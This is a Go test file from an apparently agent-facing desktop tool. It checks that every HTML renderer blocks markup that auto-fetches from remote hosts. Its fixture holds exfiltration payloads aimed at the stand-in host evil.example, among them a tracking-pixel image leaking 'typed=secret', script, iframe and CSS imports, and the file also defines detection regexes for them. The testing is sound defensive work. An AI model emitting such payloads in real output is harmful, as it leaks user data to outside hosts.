package webui

import (
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"testing"

	"github.com/borismilner/agentbox/internal/daemon"
	"github.com/borismilner/agentbox/internal/proto"
	"github.com/borismilner/agentbox/internal/session"
	"github.com/borismilner/agentbox/internal/store"
)

// One invariant, stated over every surface at once: nothing agentbox hands a webview
// makes the browser fetch from a host on its own.
//
// images_test.go pins this for one renderer and one kind of node. This file pins
// it for the whole output of every Go path that produces HTML for a surface, with
// content written the way an attacker would write it - because the interesting
// failure is not "the image renderer regressed", it is "some new fence, encoder or
// passthrough started emitting markup nobody thought about". There is no offscreen
// renderer any more (the Gio harness went with the cutover), so this is the check
// that runs on every `make check` instead.
//
// A LINK IS NOT A FETCH and is deliberately allowed: `<a href="https://...">`
// needs a click and agentbox routes it to the desktop browser rather than navigating
// the window. The rule is about what loads by itself.

// fetchingAttrs are the attributes a browser resolves without being asked. `data`
// is <object data>; `href` is checked separately because only <link> fetches it.
var (
	reFetchQuoted = regexp.MustCompile(`(?i)(?:^|[\s"'])(srcset|src|poster|background|data|xlink:href)\s*=\s*"([^"]*)"`)
	reFetchSingle = regexp.MustCompile(`(?i)(?:^|[\s"'])(srcset|src|poster|background|data|xlink:href)\s*=\s*'([^']*)'`)
	reFetchBare   = regexp.MustCompile(`(?i)(?:^|\s)(srcset|src|poster|background|data|xlink:href)\s*=\s*([^\s>"']+)`)
	reLinkHref    = regexp.MustCompile(`(?i)<link\b[^>]*\bhref\s*=\s*["']?([^"'\s>]+)`)
	reCSSURL      = regexp.MustCompile(`(?i)url\(\s*["']?([^)"']+)`)
	reCSSImport   = regexp.MustCompile(`(?i)@import\s+(?:url\(\s*)?["']?([^)"';\s]+)`)
	reScheme2     = regexp.MustCompile(`^[a-zA-Z][a-zA-Z0-9+.\-]*:`)
	// CSS references fetch only from CSS contexts: a real <style> element or a
	// style attribute. Escaped code that merely CONTAINS the characters
	// url(https://...) is text and cannot load anything - and the review board
	// renders whole files, where a cited stylesheet rule is ordinary content.
	// So url()/@import are audited inside these extracts, not everywhere.
	reStyleEl   = regexp.MustCompile(`(?is)<style\b[^>]*>(.*?)</style>`)
	reStyleAttr = regexp.MustCompile(`(?i)\bstyle\s*=\s*(?:"([^"]*)"|'([^']*)')`)
)

// remoteRef reports whether a resolved reference would leave the machine. An
// empty value, a fragment, a root-relative asset path and the two inline schemes
// are the only things that may not.
func remoteRef(v string) bool {
	v = strings.TrimSpace(v)
	switch {
	case v == "", strings.HasPrefix(v, "#"):
		return false
	case strings.HasPrefix(v, "//"):
		return true // protocol-relative: whatever the surface is, over the network
	}
	if m := reScheme2.FindString(v); m != "" {
		switch strings.ToLower(m) {
		case "data:", "blob:":
			return false
		}
		return true
	}
	return false // a relative or root-relative path stays inside the webview
}

// auditFetches returns every reference in html that would load by itself and is
// remote. The label only reaches a failure message.
func auditFetches(t *testing.T, label, html string) {
	t.Helper()
	check := func(kind, value string) {
		if remoteRef(value) {
			t.Errorf("%s: %s would be fetched from off this machine: %q", label, kind, value)
		}
	}
	for _, re := range []*regexp.Regexp{reFetchQuoted, reFetchSingle, reFetchBare} {
		for _, m := range re.FindAllStringSubmatch(html, -1) {
			// srcset is a comma-separated list of candidates.
			for part := range strings.SplitSeq(m[2], ",") {
				check(strings.ToLower(m[1]), strings.TrimSpace(strings.Fields(part + " ")[0]))
			}
		}
	}
	for _, m := range reLinkHref.FindAllStringSubmatch(html, -1) {
		check("a stylesheet reference", m[1])
	}
	var css strings.Builder
	for _, m := range reStyleEl.FindAllStringSubmatch(html, -1) {
		css.WriteString(m[1] + "\n")
	}
	for _, m := range reStyleAttr.FindAllStringSubmatch(html, -1) {
		css.WriteString(m[1] + m[2] + "\n")
	}
	for _, re := range []*regexp.Regexp{reCSSURL, reCSSImport} {
		for _, m := range re.FindAllStringSubmatch(css.String(), -1) {
			check("a stylesheet reference", m[1])
		}
	}
}

// hostileMarkdown is what an agent would send if it wanted the surface to make a
// request for it. Every line is a way to name a host that a renderer might pass
// through: markdown's own image syntax, raw HTML of every fetching kind, a fence
// that runs, and CSS.
func hostileMarkdown(t *testing.T) string {
	t.Helper()
	local := writeFile(t, "ok.png", pngBytes(t))
	return strings.Join([]string{
		"# A turn from an agent",
		"",
		"![a tracking pixel](https://evil.example/p.gif?typed=secret)",
		"![protocol relative](//evil.example/p.gif)",
		"![a scheme nobody knows](gopher://evil.example/p.gif)",
		"![a local file](" + local + ")",
		"",
		`<img src="https://evil.example/raw.gif">`,
		`<img srcset="https://evil.example/1x.gif 1x, https://evil.example/2x.gif 2x">`,
		`<script src="https://evil.example/x.js"></script>`,
		`<link rel="stylesheet" href="https://evil.example/x.css">`,
		`<iframe src="https://evil.example/frame"></iframe>`,
		`<object data="https://evil.example/x.swf"></object>`,
		`<video poster="https://evil.example/poster.jpg"></video>`,
		`<body background="https://evil.example/bg.gif">`,
		`<svg><image xlink:href="https://evil.example/x.png"/></svg>`,
		`<style>@import url("https://evil.example/x.css"); body { background: url(https://evil.example/bg.png) }</style>`,
		"",
		"An ordinary [link to a host](https://example.com/page), which is allowed.",
		"",
		"```html",
		`<script src="https://cdn.evil.example/react.js"></script>`,
		`<div class="p-4 flex gap-2"><img src="https://evil.example/in-a-fence.gif"></div>`,
		"```",
		"",
		"```artifact",
		`<script src="https://cdn.evil.example/lib.js"></script>`,
		`<img src="https://evil.example/in-an-artifact.gif">`,
		"```",
		"",
		"| a table | with an image |",
		"|---|---|",
		"| one | ![x](https://evil.example/cell.gif) |",
		"",
		"> [!WARNING]",
		"> ![x](https://evil.example/alert.gif)",
	}, "\n")
}

// The sweep. Every producer of surface HTML in this package, fed the same hostile
// document, so a new one that forgets the rule fails here rather than on a screen.
func TestNoSurfaceHTMLEverAutoFetches(t *testing.T) {
	src := hostileMarkdown(t)
	u := confUI()

	// The four fields the surfaces inject with {@html}, plus the two exported
	// renderers behind them and the artifact document.
	outputs := map[string]string{
		// Card.svelte and Toast.svelte: view.bodyHtml
		"card body (encode)": u.encode(daemon.View{
			Item: &proto.Item{ID: "a", Kind: proto.KindNotify, Body: src},
		}).BodyHTML,
		// Session.svelte: seg.html, for prose and for thinking
		"agent prose (encodeTurns)": segHTML(encodeTurns([]session.Turn{{
			Role: session.RoleAssistant,
			Segments: []session.Segment{
				{Kind: session.SegText, Text: src},
				{Kind: session.SegThinking, Text: src},
			},
		}})),
		// Session.svelte: seg.toolHtml, a tool call's own argument highlighted as
		// shell. It is agent-supplied text going through a lexer, so it belongs in
		// this sweep as much as prose does.
		"a tool argument (HighlightInline)": HighlightInline(src, "bash"),
		// AskPanel.svelte: ask.bodyHtml
		"an inline question (RenderMarkdown)": RenderMarkdown(src),
		// Inbox.svelte: det.bodyHtml - a row read back in full (FR73). Through
		// encodeDetail rather than the renderer directly, because the detail is the
		// one payload that is not allowed to shorten anything on its way out.
		"a row read back (encodeDetail)": encodeDetail(store.StoredItem{
			Item:  proto.Item{ID: "d", Kind: proto.KindNotify, Body: src},
			State: store.StateAnswered,
		}, false, true).BodyHTML,
		// Viewer.svelte: doc.html, both ways it is produced
		"a document with a base": RenderMarkdownIn(src, t.TempDir()),
		"an artifact document":   RenderArtifact("<script src=\"https://cdn.evil.example/x.js\"></script><img src=\"https://evil.example/a.gif\">", "t", "id1"),
		// Assignments.svelte: open.panelBlock - an assignment's custom parameter
		// panel, agent-authored like any artifact and held to the same rule.
		"a parameter panel (RenderPanel)": RenderPanel("<script src=\"https://cdn.evil.example/p.js\"></script><img src=\"https://evil.example/p.gif\">", "t", "id2"),
		"one line (ParseInline)":          ParseInline("![x](https://evil.example/inline.gif) and text"),
		// Board.svelte: ln.html - a cited file whose CONTENT is hostile, plus
		// hostile snippet text; the walkthrough spec is agent-authored and the
		// files it cites are whatever sits in the repo.
		"a board code line (renderSteps)": boardLineHTML(t, src),
	}
	for label, html := range outputs {
		if html == "" {
			t.Fatalf("%s produced nothing; the sweep would pass vacuously", label)
		}
		auditFetches(t, label, html)
	}

	// The viewer, through its own load path rather than the renderer directly: a
	// document read off disk is the case with a base directory.
	dir := t.TempDir()
	path := filepath.Join(dir, "doc.md")
	if err := os.WriteFile(path, []byte(src), 0o644); err != nil {
		t.Fatal(err)
	}
	v := testViewer()
	v.load(proto.ShowRequest{Path: path})
	auditFetches(t, "the viewer's own document", v.snapshot().HTML)
}

// The auditor's own teeth, pinned: a REAL CSS context still fails, so the
// context-aware url() scan above cannot rot into an exemption.
func TestAuditStillCatchesRealCSS(t *testing.T) {
	for _, html := range []string{
		`<style>body { background: url(https://evil.example/bg.png) }</style>`,
		`<style>@import "https://evil.example/x.css";</style>`,
		`<div style="background: url('https://evil.example/a.png')">x</div>`,
	} {
		failed := false
		mock := &testing.T{}
		func() { defer func() { failed = mock.Failed() }(); auditFetches(mock, "self-test", html) }()
		if !failed {
			t.Errorf("auditFetches let a real CSS fetch through: %s", html)
		}
	}
	// And the board's case stays text: escaped code merely containing the
	// characters does not fetch and must not fail.
	ok := &testing.T{}
	auditFetches(ok, "self-test", `<span class="k">url(https://example.com/in-code.png)</span>`)
	if ok.Failed() {
		t.Error("auditFetches flagged url() outside any CSS context")
	}
}

// The exemption, stated so it cannot be lost by accident: a link survives, because
// a link is a thing you click and agentbox opens it in the desktop browser.
func TestALinkIsStillALink(t *testing.T) {
	got := RenderMarkdown("read [the changelog](https://example.com/changelog) first")
	if !strings.Contains(got, `href="https://example.com/changelog"`) {
		t.Errorf("a link should keep its destination:\n%s", got)
	}
	// And it is not turned into something that loads by itself.
	auditFetches(t, "a link", got)
}

// The hostile document has to actually reach the renderers, or the sweep proves
// nothing. This asserts the fixture is dangerous: every host in it is refused
// somewhere visible, and the local file that should work does.
func TestTheHostileFixtureIsActuallyHostile(t *testing.T) {
	got := RenderMarkdown(hostileMarkdown(t))

	if n := strings.Count(got, `data-reason="remote"`); n < 3 {
		t.Errorf("only %d remote images were refused; the fixture is not exercising the rule:\n%s", n, got)
	}
	if !strings.Contains(got, `src="data:image/png;base64,`) {
		t.Error("the local PNG in the fixture should still be inlined, or the sweep is passing by rendering nothing")
	}
	if !strings.Contains(got, "k-artifact") {
		t.Error("the artifact fence should have produced an artifact block")
	}
	// Raw HTML is dropped before any of this runs, which is the other half of the
	// rule and the reason `![]()` was the only hole.
	if strings.Contains(got, "evil.example/raw.gif\">") {
		t.Error("raw HTML reached the surface as markup")
	}
}

func segHTML(turns []wireTurn) string {
	var b strings.Builder
	for _, t := range turns {
		for _, s := range t.Segments {
			b.WriteString(s.HTML)
		}
	}
	return b.String()
}
